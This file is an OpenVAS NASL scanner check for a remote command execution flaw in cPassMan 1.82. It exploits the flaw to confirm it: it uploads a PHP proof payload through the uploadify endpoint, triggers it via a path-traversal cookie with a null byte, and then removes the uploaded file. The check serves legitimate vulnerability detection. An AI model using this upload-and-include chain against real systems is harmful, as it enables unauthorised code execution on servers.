###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cpassman_47379.nasl 10005 2018-05-29 13:54:41Z cfischer $
#
# Collaborative Passwords Manager (cPassMan) Remote Command Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103436");
 script_version("$Revision: 10005 $");
 script_tag(name:"last_modification", value:"$Date: 2018-05-29 15:54:41 +0200 (Tue, 29 May 2018) $");
 script_tag(name:"creation_date", value:"2012-02-27 10:11:37 +0200 (Mon, 27 Feb 2012)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("Collaborative Passwords Manager (cPassMan) Remote Command Execution");

 script_xref(name : "URL" , value : "http://code.google.com/p/cpassman/");
 script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18522/");
 script_xref(name : "URL" , value : "http://cpassman.org/");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_passman_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("cpassman/installed");

 script_tag(name : "summary" , value : "cPassMan is prone to a remote command execution vulnerability because it fails to
properly sanitize user supplied input.");
 script_tag(name : "impact" , value : "Successful exploitation allows execution of arbitrary
commands, and possibly compromise the affected application.");
 script_tag(name : "affected" , value : "cPassMan 1.82 is vulnerable. Other versions may also be affected.");

 script_tag(name:"solution_type", value:"NoneAvailable");

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if(!dir = get_dir_from_kb(port:port,app:"passman"))exit(0);

file = "openvas-ul-test";
rand = rand();
ex = "<?php echo " + rand + "; phpinfo(); die; ?>";
len = strlen(ex)+200;

url = string(dir, "/includes/libraries/uploadify/uploadify.php");

host = http_host_name(port:port);

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Content-Type: multipart/form-data; boundary=---------------------------4827543632391\r\n",
             "Content-Length: ",len,"\r\n\r\n",
             "-----------------------------4827543632391\r\n",
             'Content-Disposition: form-data; name="Filedata"; filename="',file,'";',"\r\n",
             "Content-Type: text/plain\r\n",
             "\r\n",
             ex,"\r\n",
             "-----------------------------4827543632391--\r\n\r\n");
result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(result =~ "HTTP/1.. 200") {

  req = string("GET ", dir, "/index.php HTTP/1.1\r\n",
               "Host: ", host,"\r\n",
               "Cookie: user_language=../../../276f0f051b1d4f8946a361aa7dc1aee1%00\r\n",
               "Content-Length: 0\r\n\r\n");
  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if("<title>phpinfo()" >< result && rand >< result) {

    # clean up...
    ex = "";
    len = strlen(ex)+200;

    req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Content-Type: multipart/form-data; boundary=---------------------------4827543632391\r\n",
             "Content-Length: ",len,"\r\n\r\n",
             "-----------------------------4827543632391\r\n",
             'Content-Disposition: form-data; name="Filedata"; filename="',file,'";',"\r\n",
             "Content-Type: text/plain\r\n",
             "\r\n",
             ex,"\r\n",
             "-----------------------------4827543632391--\r\n\r\n");
    http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    security_message(port:port);
    exit(0);
  }
  exit(99);
}

exit(0);
